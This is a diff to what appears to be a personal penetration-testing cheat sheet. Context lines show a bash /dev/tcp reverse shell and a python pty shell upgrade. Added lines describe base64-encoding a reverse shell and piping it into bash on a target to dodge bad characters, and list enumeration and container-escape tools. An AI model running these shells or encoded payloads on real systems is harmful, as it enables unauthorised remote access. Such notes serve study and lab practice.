@@ -22,6 +22,11 @@ and try them out on target machine
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
 ```
+### base 64 encoding
+craft encoded rs: `echo -n "[REVERSE SHELL]" | base64 -w 0`\
+inject encoded rs on target: `echo -n [ENCODED REVERSE SHELL] | base64 -d | bash`
+> sometimes base64 encoding conatins + chars for spaces, if so add more spaces to remove + chars (sice they might be bad chars)\
+> this also works for ther payloads (not only rs)
 
 ## INTERACTIVE SHELL
 target: `python3 -c 'import pty;pty.spawn("/bin/bash")'`, hit <kbd>CTRL</kbd> + <kbd>z</kbd>\
@@ -148,7 +153,8 @@ sudo -l
 * LinEnum
 * LinPEAS
 * WinPEAS
-* pspys (lists running processes)
+* pspys - lists running processes, good for figguering out what an app does
+* deepce - docker enummeration/container escape
 ### Remote
 * enum4linux [OPTIONS] [IP] - works for windows and linux SMB SAMBA
 
